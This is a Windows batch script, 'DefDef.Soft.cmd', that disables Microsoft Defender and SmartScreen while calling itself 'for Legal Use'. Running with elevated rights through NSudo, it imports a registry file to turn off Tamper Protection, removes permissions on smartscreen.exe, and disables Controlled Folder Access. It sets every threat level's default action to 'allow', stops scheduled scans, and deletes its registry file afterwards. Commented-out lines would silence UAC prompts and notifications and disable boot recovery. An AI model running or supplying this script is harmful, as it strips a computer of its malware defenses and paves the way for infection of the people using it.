@echo on
rem *******************************************************
rem
rem DefDef.Soft.cmd
rem This Script Soft Defeat Defender and SmartScreen
rem Functionality for Legal Use
rem
rem
rem PARAMETERS:	NONE
rem RETURNS:	0 if Success Script Runs
rem		7 if not Checked Integrity or Antivirus Blocked
rem		16 if Checking Integrity Failed
rem		17 if Runs without Elevated Privileges
rem
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=DefenderDefeat
SET FIRM_NAME=NIT

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem
echo Define Folders...
rem
set curdirforurl=%CD%
set pathCMD=%SystemRoot%\System32
set testPath=%pathCMD%\config\system
set pwshPath=%pathCMD%\WindowsPowerShell\v1.0
set allDefeatPath=%TEMP%\AllDefeat

echo Define Protected Directories...
rem
set NITPROFILE=%ALLUSERSPROFILE%\%FIRM_NAME%
set PRODPROFILE=%ALLUSERSPROFILE%\%FIRM_NAME%\%PRODUCT_NAME%

rem
rem Set Directories Path
rem
rem echo Set LocalFolder...
rem
set LocalFolder=%PRODPROFILE%

echo Define Programs...
rem
set powershellexe=%pwshPath%\powershell.exe
set bcdeditexe=%pathCMD%\bcdedit.exe
set regexe=%pathCMD%\reg.exe
set scexe=%pathCMD%\sc.exe
set testcacls=%pathCMD%\cacls.exe
set icaclsexe=%pathCMD%\icacls.exe
set smartscreen=%pathCMD%\smartscreen.exe
set wscriptexe=%pathCMD%\wscript.exe
set REGINI=%pathCMD%\regini.exe
set NSUDOEXE=%LocalFolder%\nsudo.exe
set SETACLEXE=%LocalFolder%\setACL.exe
set BITSADMINEXE=%pathCMD%\bitsadmin.exe
set DisTamper=Disable-TamperProtection.reg
set DefSoftACL=DefDefeat.Soft.ACL.bat

rem
echo Check Integrity...
rem
if not exist %LocalFolder% echo %LocalFolder% not present && exit /b 7
if not exist %temp% echo %temp% not present && exit /b 7
if not exist %BITSADMINEXE% echo %BITSADMINEXE% not present && exit /b 7
if not exist %powershellexe% echo %powershellexe% not present && exit /b 7
if not exist %bcdeditexe% echo %bcdeditexe% not present && exit /b 7
if not exist %regexe% echo %regexe% not present && exit /b 7
if not exist %scexe% echo %scexe% not present && exit /b 7
if not exist %testcacls% echo %testcacls% not present && exit /b 7
if not exist %icaclsexe% echo %icaclsexe% not present && exit /b 7
if not exist %smartscreen% echo %smartscreen% not present && exit /b 7
if not exist %wscriptexe% echo %wscriptexe% not present && exit /b 7
rem  if not exist %REGINI% echo %REGINI% not present && exit /b 7

title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
exit /b 17
rem
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    %wscriptexe% "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B 0

:gotAdmin
echo Run as Admin...

echo  Installing Necessary Packages.....Please Wait.....

cd /d %LocalFolder%

if not exist %NSUDOEXE% echo %NSUDOEXE% not present && exit /b 7
if not exist %SETACLEXE% echo %SETACLEXE% not present && exit /b 7
if not exist %LocalFolder%\%DisTamper% echo %LocalFolder%\%DisTamper% not present && exit /b 7
if not exist %LocalFolder%\%DefSoftACL% echo %LocalFolder%\%DefSoftACL% not present && exit /b 7

rem
echo Define Packets Variables...
rem

echo Set Registry Nodes ACLs...
rem
call %LocalFolder%\%DefSoftACL%
echo Disable Tamper Protection (if Possible)...
%NSUDOEXE% -U:S -ShowWindowMode:Show -Wait -UseCurrentConsole ^
  %regexe% import %LocalFolder%\%DisTamper%

echo Set Defeats...
rem

:Payloads
rem Run Payloads
rem


%NSUDOEXE% -U:T -ShowWindowMode:Show ^
 icacls "%smartscreen%" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18

rem %NSUDOEXE% -U:T -ShowWindowMode:Show ^
rem    %regexe% add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v ^
rem   "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f

rem %NSUDOEXE% -U:T -ShowWindowMode:Show ^
rem  %regexe% add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v ^
rem  "Notification_Suppress" /t REG_DWORD /d "1" /f

%NSUDOEXE% -U:T -ShowWindowMode:Show %regexe% import %LocalFolder%\%DisTamper%

rem rem %NSUDOEXE% -U:T -ShowWindowMode:Hide %bcdeditexe% /set {default} recoveryenabled No

rem rem %NSUDOEXE% -U:T -ShowWindowMode:Hide %bcdeditexe% /set {default} bootstatuspolicy ignoreallfailures

%powershellexe% -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

rem rem %powershellexe% -command "Set-MpPreference -PUAProtection Disabled"

%powershellexe% -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
%powershellexe% -command "Set-MpPreference -ModerateThreatDefaultAction 6"
%powershellexe% -command "Set-MpPreference -LowThreatDefaultAction 6"
%powershellexe% -command "Set-MpPreference -SevereThreatDefaultAction 6"
%powershellexe% -command "Set-MpPreference -ScanScheduleDay 8"

rem rem cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

del /Q /F %LocalFolder%\%DisTamper%
rem del /Q /F %LocalFolder%\%DefSoftACL%

echo Success Script Run %0
goto End

:End
echo The End of the Script %0
exit /b %errstatus1%

